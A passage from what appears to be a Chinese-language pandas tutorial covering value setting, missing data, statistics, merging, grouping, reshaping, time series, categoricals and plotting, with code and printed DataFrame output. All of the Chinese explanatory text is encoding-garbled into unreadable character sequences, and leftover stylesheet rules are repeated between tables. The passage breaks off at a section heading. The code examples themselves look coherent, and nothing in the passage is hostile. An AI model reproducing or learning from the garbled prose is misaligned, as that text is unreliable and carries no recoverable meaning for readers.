df['F'] = s1 é€šè¿‡æ ‡ç­¾è®¾ç½®æ–°çš„å€¼ df.at[dates[0],'A'] = 0 é€šè¿‡æ ‡ç­¾è®¾ç½®æ–°çš„å€¼ df.iat[0,1] = 0 é€šè¿‡ä¸€ä¸ª numpy æ•°ç»„è®¾ç½®ä¸€ç»„æ–°å€¼ df.loc[:,'D'] = np.array([5] * len(df)) ä¸Šè¿°æ“ä½œç»“æœå¦‚ä¸‹ df .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D F 2020-04-16 0.000000 0.000000 0.743378 5 1 2020-04-17 -0.423923 0.564346 -2.318931 5 2 2020-04-18 -2.032243 2.046827 1.176614 5 3 2020-04-19 -1.200005 1.109991 -1.527804 5 4 2020-04-20 -0.535031 1.351420 0.907865 5 5 2020-04-21 -0.614734 0.027143 -0.420875 5 6 é€šè¿‡ where æ“ä½œæ¥è®¾ç½®æ–°çš„å€¼ df2 = df.copy() df2[df2 &gt; 0] = -df2 df2 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D F 2020-04-16 0.000000 0.000000 -0.743378 -5 -1 2020-04-17 -0.423923 -0.564346 -2.318931 -5 -2 2020-04-18 -2.032243 -2.046827 -1.176614 -5 -3 2020-04-19 -1.200005 -1.109991 -1.527804 -5 -4 2020-04-20 -0.535031 -1.351420 -0.907865 -5 -5 2020-04-21 -0.614734 -0.027143 -0.420875 -5 -6 0x06 ç¼ºå¤±å€¼å¤„ç† Missing Dataåœ¨pandasä¸­ï¼Œä½¿ç”¨np.nanæ¥ä»£æ›¿ç¼ºå¤±å€¼ï¼Œè¿™äº›å€¼å°†é»˜è®¤ä¸ä¼šåŒ…å«åœ¨è®¡ç®—ä¸­ã€‚ reindex()æ–¹æ³•å¯ä»¥å¯¹æŒ‡å®šè½´ä¸Šçš„ç´¢å¼•è¿›è¡Œæ”¹å˜/å¢åŠ /åˆ é™¤æ“ä½œï¼Œè¿”å›åŸå§‹æ•°æ®çš„ä¸€ä¸ªæ‹·è´ã€‚ df1 = df.reindex(index=dates[0:4], columns=list(df.columns) + ['E']) df1 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D F E 2020-04-16 0.000000 0.000000 0.743378 5 1 NaN 2020-04-17 -0.423923 0.564346 -2.318931 5 2 NaN 2020-04-18 -2.032243 2.046827 1.176614 5 3 NaN 2020-04-19 -1.200005 1.109991 -1.527804 5 4 NaN df1.loc[dates[0]:dates[1],'E'] = 1 df1 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D F E 2020-04-16 0.000000 0.000000 0.743378 5 1 1.0 2020-04-17 -0.423923 0.564346 -2.318931 5 2 1.0 2020-04-18 -2.032243 2.046827 1.176614 5 3 NaN 2020-04-19 -1.200005 1.109991 -1.527804 5 4 NaN å»æ‰åŒ…å«ç¼ºå¤±å€¼çš„è¡Œ df1.dropna(how='any') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D F E 2020-04-16 0.000000 0.000000 0.743378 5 1 1.0 2020-04-17 -0.423923 0.564346 -2.318931 5 2 1.0 å¡«å……ç¼ºå¤±çš„å€¼ï¼Œåˆ©ç”¨valueæ¥æŒ‡å®š print(df1) df1.fillna(value=5) A B C D F E 2020-04-16 0.000000 0.000000 0.743378 5 1 1.0 2020-04-17 -0.423923 0.564346 -2.318931 5 2 1.0 2020-04-18 -2.032243 2.046827 1.176614 5 3 NaN 2020-04-19 -1.200005 1.109991 -1.527804 5 4 NaN .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D F E 2020-04-16 0.000000 0.000000 0.743378 5 1 1.0 2020-04-17 -0.423923 0.564346 -2.318931 5 2 1.0 2020-04-18 -2.032243 2.046827 1.176614 5 3 5.0 2020-04-19 -1.200005 1.109991 -1.527804 5 4 5.0 è·å–å€¼ä¸ºnançš„å¸ƒå°”å€¼(boolean mask) pd.isna(df1) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D F E 2020-04-16 False False False False False False 2020-04-17 False False False False False False 2020-04-18 False False False False False True 2020-04-19 False False False False False True 0x07 ä¸€äº›å¸¸ç”¨çš„æ“ä½œ Operations0x07-1 ç»Ÿè®¡ Statsè¿™äº›æ“ä½œä¸åŒ…æ‹¬ç¼ºå¤±æ•°æ® æ‰§è¡Œæè¿°æ€§ç»Ÿè®¡ï¼š df.mean() # å‡å€¼ï¼Œé»˜è®¤ä¸ºåˆ—çš„ A -0.800989 B 0.849955 C -0.239959 D 5.000000 F 3.500000 dtype: float64 df.mean(1) # æŒ‡å®šåæ ‡è½´ï¼ˆæ­¤å¤„ä¸ºè¡Œï¼‰ 2020-04-16 1.348676 2020-04-17 0.964299 2020-04-18 1.838240 2020-04-19 1.476436 2020-04-20 2.344851 2020-04-21 1.998307 Freq: D, dtype: float64 å¯¹äºæ‹¥æœ‰ä¸åŒç»´åº¦ï¼Œéœ€è¦å¯¹é½å¯¹è±¡å†è¿›è¡Œæ“ä½œã€‚ Pandas ä¼šè‡ªåŠ¨çš„æ²¿ç€æŒ‡å®šçš„ç»´åº¦è¿›è¡Œå¹¿æ’­ã€‚ s = pd.Series([1,3,5,np.nan,6,8], index=dates).shift(2) s 2020-04-16 NaN 2020-04-17 NaN 2020-04-18 1.0 2020-04-19 3.0 2020-04-20 5.0 2020-04-21 NaN Freq: D, dtype: float64 print(df) df.sub(s, axis='index') # df-s A B C D F 2020-04-16 0.000000 0.000000 0.743378 5 1 2020-04-17 -0.423923 0.564346 -2.318931 5 2 2020-04-18 -2.032243 2.046827 1.176614 5 3 2020-04-19 -1.200005 1.109991 -1.527804 5 4 2020-04-20 -0.535031 1.351420 0.907865 5 5 2020-04-21 -0.614734 0.027143 -0.420875 5 6 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D F 2020-04-16 NaN NaN NaN NaN NaN 2020-04-17 NaN NaN NaN NaN NaN 2020-04-18 -3.032243 1.046827 0.176614 4.0 2.0 2020-04-19 -4.200005 -1.890009 -4.527804 2.0 1.0 2020-04-20 -5.535031 -3.648580 -4.092135 0.0 0.0 2020-04-21 NaN NaN NaN NaN NaN 0x07-2 åº”ç”¨æ–¹æ³•åˆ°æ•°æ® ApplyApplying functions to the data df.apply(np.cumsum) # cumsum é»˜è®¤æŒ‰ç…§è¡Œç´¯åŠ  .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D F 2020-04-16 0.000000 0.000000 0.743378 5 1 2020-04-17 -0.423923 0.564346 -1.575552 10 3 2020-04-18 -2.456166 2.611174 -0.398938 15 6 2020-04-19 -3.656170 3.721165 -1.926743 20 10 2020-04-20 -4.191201 5.072585 -1.018877 25 15 2020-04-21 -4.805935 5.099728 -1.439752 30 21 df.apply(np.cumsum,axis=1) # æŒ‡å®š cumsum çš„ axis å‚æ•°ï¼ŒæŒ‰ç…§åˆ—ç´¯åŠ  .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D F 2020-04-16 0.000000 0.000000 0.743378 5.743378 6.743378 2020-04-17 -0.423923 0.140424 -2.178507 2.821493 4.821493 2020-04-18 -2.032243 0.014584 1.191198 6.191198 9.191198 2020-04-19 -1.200005 -0.090013 -1.617818 3.382182 7.382182 2020-04-20 -0.535031 0.816389 1.724255 6.724255 11.724255 2020-04-21 -0.614734 -0.587591 -1.008466 3.991534 9.991534 df.apply(lambda x: x.max() - x.min()) A 2.032243 B 2.046827 C 3.495545 D 0.000000 F 5.000000 dtype: float64 0x07-3 ç›´æ–¹å›¾ Histogrammings = pd.Series(np.random.randint(0, 7, size=10)) s 0 0 1 4 2 5 3 0 4 3 5 2 6 2 7 0 8 5 9 1 dtype: int32 s.value_counts() 0 3 5 2 2 2 4 1 3 1 1 1 dtype: int64 0x07-4 å­—ç¬¦ä¸²æ–¹æ³• String MethodsSeries åœ¨strå±æ€§ä¸­å‡†å¤‡äº†ä¸€ç»„å­—ç¬¦ä¸²å¤„ç†æ–¹æ³•ï¼Œå¯ä»¥æ–¹ä¾¿åœ°å¯¹æ•°ç»„çš„æ¯ä¸ªå…ƒç´ è¿›è¡Œæ“ä½œï¼Œå¦‚ä¸‹é¢çš„ä»£ç ç‰‡æ®µæ‰€ç¤ºã€‚ æ³¨æ„strä¸­çš„æ¨¡å¼åŒ¹é…é€šå¸¸é»˜è®¤ä½¿ç”¨â€™æ­£åˆ™è¡¨è¾¾å¼ï¼ˆåœ¨æŸäº›æƒ…å†µä¸‹æ€»æ˜¯ä½¿ç”¨å®ƒä»¬ï¼‰ã€‚ s = pd.Series(['A', 'B', 'C', 'Aaba', 'Baca', np.nan, 'CABA', 'dog', 'cat']) s.str.lower() 0 a 1 b 2 c 3 aaba 4 baca 5 NaN 6 caba 7 dog 8 cat dtype: object 0x08 åˆå¹¶ Mergepandas æä¾›äº†ä¸€ç³»åˆ—çš„æ–¹æ³•ï¼Œåœ¨ join/merge æ“ä½œä¸­ï¼Œå¯ä»¥è½»æ¾åœ°å¯¹Series, DataFrameå’ŒPanelå¯¹è±¡è¿›è¡Œå„ç§é›†åˆé€»è¾‘ä»¥åŠå…³ç³»ä»£æ•°çš„æ“ä½œã€‚ 0x08-1 Concatdf = pd.DataFrame(np.random.randn(10, 4)) df .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; 0 1 2 3 0 -0.089143 0.087569 0.218078 -0.336815 1 -0.694835 0.108324 -1.882762 -0.220210 2 -2.069784 -0.788424 -1.694595 0.569263 3 2.433036 0.719851 -0.109935 0.177864 4 -0.838252 1.117676 0.880839 -1.118529 5 1.706060 0.290877 -0.907941 -0.532450 6 0.118169 -0.496975 -0.190422 0.783875 7 -1.213645 -0.489622 -0.798443 -0.471611 8 -0.314598 -2.658906 -1.139778 0.374437 9 0.229281 -1.372309 0.996916 -1.013462 # break it into pieces pieces = [df[:3], df[3:7], df[7:]] pieces [ 0 1 2 3 0 -0.089143 0.087569 0.218078 -0.336815 1 -0.694835 0.108324 -1.882762 -0.220210 2 -2.069784 -0.788424 -1.694595 0.569263, 0 1 2 3 3 2.433036 0.719851 -0.109935 0.177864 4 -0.838252 1.117676 0.880839 -1.118529 5 1.706060 0.290877 -0.907941 -0.532450 6 0.118169 -0.496975 -0.190422 0.783875, 0 1 2 3 7 -1.213645 -0.489622 -0.798443 -0.471611 8 -0.314598 -2.658906 -1.139778 0.374437 9 0.229281 -1.372309 0.996916 -1.013462] pd.concat(pieces) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; 0 1 2 3 0 -0.089143 0.087569 0.218078 -0.336815 1 -0.694835 0.108324 -1.882762 -0.220210 2 -2.069784 -0.788424 -1.694595 0.569263 3 2.433036 0.719851 -0.109935 0.177864 4 -0.838252 1.117676 0.880839 -1.118529 5 1.706060 0.290877 -0.907941 -0.532450 6 0.118169 -0.496975 -0.190422 0.783875 7 -1.213645 -0.489622 -0.798443 -0.471611 8 -0.314598 -2.658906 -1.139778 0.374437 9 0.229281 -1.372309 0.996916 -1.013462 0x08-2 Joinç±»ä¼¼äº SQL ç±»å‹çš„åˆå¹¶ã€‚ ä¸‹é¢æ˜¯ key ç›¸åŒçš„æƒ…å†µã€‚ left = pd.DataFrame({'key': ['foo', 'foo'], 'lval': [1, 2]}) left .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; key lval 0 foo 1 1 foo 2 right = pd.DataFrame({'key': ['foo', 'foo'], 'rval': [4, 5]}) right .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; key rval 0 foo 4 1 foo 5 pd.merge(left, right, on='key') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; key lval rval 0 foo 1 4 1 foo 1 5 2 foo 2 4 3 foo 2 5 å¦ä¸€ä¸ªä¾‹å­ï¼Œkey ä¸åŒçš„æƒ…å†µã€‚ left = pd.DataFrame({'key': ['foo', 'bar'], 'lval': [1, 2]}) left .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; key lval 0 foo 1 1 bar 2 right = pd.DataFrame({'key': ['foo', 'bar'], 'rval': [4, 5]}) right .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; key rval 0 foo 4 1 bar 5 pd.merge(left, right, on='key') .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; key lval rval 0 foo 1 4 1 bar 2 5 0x08-3 Appendå°†ä¸€è¡ŒåŠ å…¥åˆ°ä¸€ä¸ª DataFrame ä¸Š df = pd.DataFrame(np.random.randn(8, 4), columns=['A','B','C','D']) df .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D 0 -2.727829 -1.382168 0.961920 0.083472 1 -0.297131 -0.294723 0.303267 -0.539177 2 -0.226735 -2.157170 1.559418 0.102023 3 0.569927 -0.800855 0.918515 1.630873 4 0.402999 -2.238052 2.181635 1.950669 5 1.238971 -0.165159 0.688200 0.793499 6 1.356265 -0.034859 -0.020774 0.485487 7 -1.793398 0.900625 0.365789 -2.089145 s = df.iloc[3] df.append(s, ignore_index=True) # å¿½ç•¥ index .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D 0 -2.727829 -1.382168 0.961920 0.083472 1 -0.297131 -0.294723 0.303267 -0.539177 2 -0.226735 -2.157170 1.559418 0.102023 3 0.569927 -0.800855 0.918515 1.630873 4 0.402999 -2.238052 2.181635 1.950669 5 1.238971 -0.165159 0.688200 0.793499 6 1.356265 -0.034859 -0.020774 0.485487 7 -1.793398 0.900625 0.365789 -2.089145 8 0.569927 -0.800855 0.918515 1.630873 s = df.iloc[4] df.append(s, ignore_index=False) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D 0 -2.727829 -1.382168 0.961920 0.083472 1 -0.297131 -0.294723 0.303267 -0.539177 2 -0.226735 -2.157170 1.559418 0.102023 3 0.569927 -0.800855 0.918515 1.630873 4 0.402999 -2.238052 2.181635 1.950669 5 1.238971 -0.165159 0.688200 0.793499 6 1.356265 -0.034859 -0.020774 0.485487 7 -1.793398 0.900625 0.365789 -2.089145 4 0.402999 -2.238052 2.181635 1.950669 0x09 åˆ†ç»„ Groupingå¯¹äºåˆ†ç»„(group by)ï¼Œé€šå¸¸æœ‰ä¸‹é¢å‡ ä¸ªæ“ä½œæ­¥éª¤ï¼š Splitting æŒ‰ç…§ä¸€äº›è§„åˆ™å°†æ•°æ®åˆ†ä¸ºä¸åŒçš„ç»„ Applying å¯¹äºæ¯ç»„æ•°æ®åˆ†åˆ«æ‰§è¡Œä¸€ä¸ªå‡½æ•° Combining å°†ç»“æœç»„åˆåˆ°ä¸€ä¸ªæ•°æ®ç»“æ„ä¸­ df = pd.DataFrame({'A' : ['foo', 'bar', 'foo', 'bar', 'foo', 'bar', 'foo', 'foo'], 'B' : ['one', 'one', 'two', 'three', 'two', 'two', 'one', 'three'], 'C' : np.random.randn(8), 'D' : np.random.randn(8)}) df .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D 0 foo one 1.038586 2.040014 1 bar one 0.454452 -0.553457 2 foo two -0.730273 -0.207136 3 bar three 0.435136 0.443462 4 foo two 2.557988 -1.831259 5 bar two 1.131084 0.915332 6 foo one 1.078171 0.037355 7 foo three 2.057203 1.209778 åˆ†ç»„å¹¶å¯¹å¾—åˆ°çš„åˆ†ç»„æ‰§è¡Œsumå‡½æ•°ã€‚ df.groupby('A').sum() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; C D A bar -1.001520 1.880284 foo 1.365107 1.459170 é€šè¿‡å¤šä¸ªåˆ—è¿›è¡Œåˆ†ç»„å½¢æˆä¸€ä¸ªå±‚æ¬¡(hierarchical)ç´¢å¼•ï¼Œç„¶åæ‰§è¡Œå‡½æ•°ã€‚ df.groupby(['A','B']).sum() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; C D A B bar one 0.598883 1.667737 three -0.605689 -0.531403 two -0.994715 0.743951 foo one -0.090250 0.694644 three 0.738067 1.498865 two 0.717290 -0.734339 0x0A é‡å¡‘/æ”¹å˜å½¢çŠ¶ Reshaping0x0A-1 Stacktuples = list(zip(*[['bar', 'bar', 'baz', 'baz', 'foo', 'foo', 'qux', 'qux'], ['one', 'two', 'one', 'two', 'one', 'two', 'one', 'two']])) tuples [('bar', 'one'), ('bar', 'two'), ('baz', 'one'), ('baz', 'two'), ('foo', 'one'), ('foo', 'two'), ('qux', 'one'), ('qux', 'two')] index = pd.MultiIndex.from_tuples(tuples, names=['first', 'second']) df = pd.DataFrame(np.random.randn(8, 2), index=index, columns=['A', 'B']) df .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B first second bar one 1.402402 -0.215913 two -0.305333 -0.679614 baz one 0.745205 0.872718 two 0.421718 -0.662528 foo one -1.433628 0.627898 two 2.129267 -0.260206 qux one 0.498752 -0.622814 two -0.356492 1.364184 df2 = df[:4] df2 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B first second bar one 1.402402 -0.215913 two -0.305333 -0.679614 baz one 0.745205 0.872718 two 0.421718 -0.662528 stack()æ–¹æ³•åœ¨ DataFrame åˆ—çš„å±‚æ¬¡ä¸Šè¿›è¡Œå‹ç¼© stacked = df2.stack() stacked first second bar one A 1.402402 B -0.215913 two A -0.305333 B -0.679614 baz one A 0.745205 B 0.872718 two A 0.421718 B -0.662528 dtype: float64 å¯¹äºä¸€ä¸ªç»è¿‡äº† stack çš„ DataFrame æˆ–è€… Seriesï¼ˆä»¥ MultiIndex ä½œä¸ºç´¢å¼•ï¼‰ï¼Œstack()çš„é€†è¿ç®—æ˜¯isunstack()ï¼Œé»˜è®¤æƒ…å†µä¸‹æ˜¯ unstack æœ€åä¸€å±‚ã€‚ å°±æ˜¯è¯´ï¼Œbarã€bazæ˜¯ç¬¬0çº§ï¼Œoneã€twoæ˜¯ç¬¬1çº§ï¼ŒAã€Bæ˜¯ç¬¬2çº§ã€‚ stacked.unstack() .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B first second bar one 1.402402 -0.215913 two -0.305333 -0.679614 baz one 0.745205 0.872718 two 0.421718 -0.662528 stacked.unstack(1) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; second one two first bar A 1.402402 -0.305333 B -0.215913 -0.679614 baz A 0.745205 0.421718 B 0.872718 -0.662528 stacked.unstack(0) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; first bar baz second one A 1.402402 0.745205 B -0.215913 0.872718 two A -0.305333 0.421718 B -0.679614 -0.662528 0x0A-2 æ•°æ®é€è§†è¡¨ Pivot Tablesdf = pd.DataFrame({'A' : ['one', 'one', 'two', 'three'] * 3, 'B' : ['A', 'B', 'C'] * 4, 'C' : ['foo', 'foo', 'foo', 'bar', 'bar', 'bar'] * 2, 'D' : np.random.randn(12), 'E' : np.random.randn(12)}) df .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; A B C D E 0 one A foo 0.072696 0.305015 1 one B foo 1.428383 -1.108178 2 two C foo 1.239483 0.001580 3 three A bar -0.953547 1.061740 4 one B bar 0.762730 1.161542 5 one C bar -0.372740 -0.480251 6 two A foo 0.765181 -1.034218 7 three B foo -1.858334 0.359220 8 one C foo -0.952807 1.067494 9 one A bar 0.541013 -0.280833 10 two B bar -1.810560 -0.829793 11 three C bar -1.049108 -0.295998 pd.pivot_table(df, values='D', index=['A', 'B'], columns=['C']) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; C bar foo A B one A 0.541013 0.072696 B 0.762730 1.428383 C -0.372740 -0.952807 three A -0.953547 NaN B NaN -1.858334 C -1.049108 NaN two A NaN 0.765181 B -1.810560 NaN C NaN 1.239483 0x0B æ—¶é—´åºåˆ— Time SeriesPandas åœ¨å¯¹é¢‘ç‡è½¬æ¢è¿›è¡Œé‡æ–°é‡‡æ ·æ—¶æ‹¥æœ‰ç®€å•ã€å¼ºå¤§ä¸”é«˜æ•ˆçš„åŠŸèƒ½ï¼ˆå¦‚å°†æŒ‰ç§’é‡‡æ ·çš„æ•°æ®è½¬æ¢ä¸ºæŒ‰5åˆ†é’Ÿä¸ºå•ä½è¿›è¡Œé‡‡æ ·çš„æ•°æ®ï¼‰ã€‚è¿™ç§æ“ä½œåœ¨é‡‘èé¢†åŸŸéå¸¸å¸¸è§ï¼Œä½†ä¸å±€é™äºæ­¤ã€‚ å“‡ï¼ŒåŸæ¥è¿˜å¯ä»¥è¿™æ ·ç©å”‰ï¼ˆ è¿™ä¸ªåœ¨ä¿¡å·å¤„ç†é‡Œé¢ä¹Ÿå¾ˆå¸¸ç”¨çš„å‘¢ï¼ rng = pd.date_range('1/1/2020', periods=200, freq='S') ts = pd.Series(np.random.randint(0, 500, len(rng)), index=rng) ts.resample('1Min').sum() 2020-01-01 00:00:00 13244 2020-01-01 00:01:00 14799 2020-01-01 00:02:00 15489 2020-01-01 00:03:00 3894 Freq: T, dtype: int32 æ—¶åŒºè¡¨ç¤ºrng = pd.date_range('4/16/2020 00:00', periods=5, freq='D') ts = pd.Series(np.random.randn(len(rng)), rng) ts 2020-04-16 0.872043 2020-04-17 -0.305200 2020-04-18 1.681828 2020-04-19 0.163184 2020-04-20 1.415422 Freq: D, dtype: float64 ts_utc = ts.tz_localize('UTC') ts_utc 2020-04-16 00:00:00+00:00 0.872043 2020-04-17 00:00:00+00:00 -0.305200 2020-04-18 00:00:00+00:00 1.681828 2020-04-19 00:00:00+00:00 0.163184 2020-04-20 00:00:00+00:00 1.415422 Freq: D, dtype: float64 è½¬æ¢åˆ°å¦å¤–ä¸€ä¸ªæ—¶åŒºts_utc.tz_convert('Asia/Shanghai') 2020-04-16 08:00:00+08:00 0.872043 2020-04-17 08:00:00+08:00 -0.305200 2020-04-18 08:00:00+08:00 1.681828 2020-04-19 08:00:00+08:00 0.163184 2020-04-20 08:00:00+08:00 1.415422 Freq: D, dtype: float64 æ—¶é—´è·¨åº¦è½¬æ¢rng = pd.date_range('1/1/2020', periods=5, freq='M') ts = pd.Series(np.random.randn(len(rng)), index=rng) ts 2020-01-31 0.259847 2020-02-29 -0.092969 2020-03-31 0.525985 2020-04-30 0.090362 2020-05-31 1.707569 Freq: M, dtype: float64 ps = ts.to_period() ps 2020-01 0.259847 2020-02 -0.092969 2020-03 0.525985 2020-04 0.090362 2020-05 1.707569 Freq: M, dtype: float64 ps.to_timestamp() 2020-01-01 0.259847 2020-02-01 -0.092969 2020-03-01 0.525985 2020-04-01 0.090362 2020-05-01 1.707569 Freq: MS, dtype: float64 æ—¶æœŸå’Œæ—¶é—´æˆ³ä¹‹é—´çš„è½¬æ¢ä½¿å¾—å¯ä»¥ä½¿ç”¨ä¸€äº›æ–¹ä¾¿çš„ç®—æœ¯å‡½æ•°ã€‚ ä¸‹é¢è¿™ä¸ªä¾‹å­ï¼Œè½¬æ¢ä¸€ä¸ªæ¯å¹´ä»¥11æœˆç»“æŸçš„å­£åº¦é¢‘ç‡ä¸º å­£åº¦ç»“æŸåçš„æœˆæœ«çš„ä¸Šåˆ9ç‚¹ã€‚ï¼ˆæœ‰ç‚¹æ‡µ prng = pd.period_range('1990Q1', '2000Q4', freq='Q-NOV') ts = pd.Series(np.random.randn(len(prng)), prng) ts.index = (prng.asfreq('M', 'e') + 1).asfreq('H', 's') + 9 ts.head() 1990-03-01 09:00 -1.287411 1990-06-01 09:00 1.744485 1990-09-01 09:00 0.336561 1990-12-01 09:00 -1.206576 1991-03-01 09:00 0.108631 Freq: H, dtype: float64 0x0C ç±»åˆ« Categoricalspandas å¯ä»¥åœ¨ DataFrame ä¸­æ”¯æŒ category ç±»å‹çš„æ•°æ®ã€‚ df = pd.DataFrame({\"id\":[1,2,3,4,5,6], \"raw_grade\":['a', 'b', 'b', 'a', 'a', 'e']}) å°† raw grades è½¬æ¢ä¸º category æ•°æ®ç±»å‹ã€‚ df[\"grade\"] = df[\"raw_grade\"].astype(\"category\") df[\"grade\"] 0 a 1 b 2 b 3 a 4 a 5 e Name: grade, dtype: category Categories (3, object): [a, b, e] å°† category ç±»å‹æ•°æ®é‡å‘½åä¸ºæ›´æœ‰æ„ä¹‰çš„åç§°ï¼Œåˆ©ç”¨Series.cat.categoriesæ–¹æ³•ã€‚ df[\"grade\"].cat.categories = [\"very good\", \"good\", \"very bad\"] df[\"grade\"] 0 very good 1 good 2 good 3 very good 4 very good 5 very bad Name: grade, dtype: category Categories (3, object): [very good, good, very bad] å¯¹ç±»åˆ«è¿›è¡Œé‡æ–°æ’åºï¼ŒåŒæ—¶å¢åŠ ç¼ºå¤±çš„ç±»åˆ«ã€‚ Series.catä¸‹çš„æ–¹æ³•é»˜è®¤è¿”å›ä¸€ä¸ªæ–°çš„åºåˆ—ã€‚ df[\"grade\"] = df[\"grade\"].cat.set_categories([\"very bad\", \"bad\", \"medium\", \"good\", \"very good\"]) df[\"grade\"] 0 very good 1 good 2 good 3 very good 4 very good 5 very bad Name: grade, dtype: category Categories (5, object): [very bad, bad, medium, good, very good] æ’åºæ˜¯æŒ‰ç…§ category çš„é¡ºåºè¿›è¡Œçš„ï¼Œè€Œä¸æ˜¯æŒ‰ç…§è¯æ±‡é¡ºåº(lexical order)ã€‚ df.sort_values(by=\"grade\") .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th &#123; vertical-align: top; &#125; .dataframe thead th &#123; text-align: right; &#125; id raw_grade grade 5 6 e very bad 1 2 b good 2 3 b good 0 1 a very good 3 4 a very good 4 5 a very good å¯¹ä¸€ä¸ª Category ç±»å‹çš„åˆ—è¿›è¡Œåˆ†ç»„æ—¶æ˜¾ç¤ºäº†ç©ºçš„ç±»åˆ«ã€‚ df.groupby(\"grade\").size() grade very bad 1 bad 0 medium 0 good 2 very good 3 dtype: int64 0x0D ä½œå›¾ Plottingts = pd.Series(np.random.randn(1000), index=pd.date_range('1/1/2020', periods=1000)) ts = ts.cumsum() ts.plot() &lt;matplotlib.axes._subplots.AxesSubplot at 0x250ccebcb70&gt; å¯¹äº DataFrame è€Œè¨€ï¼Œplot()æ–¹æ³•æ˜¯ä¸€ç§å°†æ‰€æœ‰å¸¦æœ‰æ ‡ç­¾çš„åˆ—è¿›è¡Œç»˜åˆ¶çš„ç®€ä¾¿æ–¹æ³•ã€‚ df = pd.DataFrame(np.random.randn(1000, 4), index=ts.index, columns=['A', 'B', 'C', 'D']) # print(df) df = df.cumsum() plt.figure() df.plot() plt.legend(loc='best') &lt;matplotlib.legend.Legend at 0x250ce7620b8&gt; &lt;Figure size 432x288 with 0 Axes&gt; ts.index DatetimeIndex(['2020-01-01', '2020-01-02', '2020-01-03', '2020-01-04', '2020-01-05', '2020-01-06', '2020-01-07', '2020-01-08', '2020-01-09', '2020-01-10', ... '2022-09-17', '2022-09-18', '2022-09-19', '2022-09-20', '2022-09-21', '2022-09-22', '2022-09-23', '2022-09-24', '2022-09-25', '2022-09-26'], dtype='datetime64[ns]', length=1000, freq='D') 0x0E å¯¼å…¥å¯¼å‡ºæ•°æ® Getting Data In/Out0x0E-1 